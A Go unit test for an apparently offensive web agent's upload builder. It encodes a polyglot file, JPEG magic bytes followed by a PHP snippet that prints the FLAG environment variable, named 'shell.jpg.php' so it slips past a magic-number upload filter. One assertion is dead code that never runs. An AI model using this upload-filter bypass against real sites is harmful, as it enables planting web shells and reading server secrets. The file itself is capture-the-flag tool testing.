package webagent

import (
	"encoding/base64"
	"strings"
	"testing"
)

// TestBuildUpload_ContentB64: content_b64 lets the agent put RAW binary bytes (a JPEG magic-number
// prefix 0xFF 0xD8) at the start of an uploaded file so it passes a magic-number filter — a plain
// UTF-8 `content` string can't carry 0xFF. Verifies the decoded bytes land verbatim in the part body.
func TestBuildUpload_ContentB64(t *testing.T) {
	raw := "\xff\xd8<?php echo getenv('FLAG'); ?>"
	body, ctype, ok, err := buildUpload(map[string]any{
		"upload": map[string]any{
			"field": "userfile", "filename": "shell.jpg.php", "content_type": "image/jpeg",
			"content_b64": base64.StdEncoding.EncodeToString([]byte(raw)),
		},
	})
	if err != nil || !ok {
		t.Fatalf("buildUpload failed: ok=%v err=%v", ok, err)
	}
	if !strings.Contains(ctype, "multipart/form-data") {
		t.Fatalf("bad content type: %s", ctype)
	}
	// the raw JPEG magic + php payload must appear verbatim in the multipart body
	if !strings.Contains(body, raw) {
		t.Fatalf("raw binary content (JPEG magic + payload) not found verbatim in body")
	}
	if body[0:0] != "" && !strings.Contains(body, "\xff\xd8") {
		t.Fatalf("JPEG magic bytes 0xFF 0xD8 missing from body")
	}
	// invalid base64 is a loud error, not silent
	if _, _, _, e := buildUpload(map[string]any{"upload": map[string]any{"content_b64": "!!!not-b64!!!"}}); e == nil {
		t.Fatal("invalid content_b64 should error")
	}
}
